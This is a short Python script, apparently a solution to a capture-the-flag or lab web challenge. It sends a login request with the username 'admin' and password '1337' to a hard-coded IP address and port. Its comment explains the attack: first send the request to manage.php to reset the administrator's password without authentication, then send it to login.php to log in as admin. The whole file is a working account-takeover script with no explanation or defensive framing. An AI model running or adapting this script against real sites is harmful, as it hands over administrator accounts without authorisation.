#!/usr/bin/python3

import requests

url = "http://134.209.188.197:31894/login.php" # First replace login.php to manage.php for password reset and then use login.php to login
data = {"username" : "admin", "password" : "1337"}

r = requests.post(url, data=data)

print(r.text)
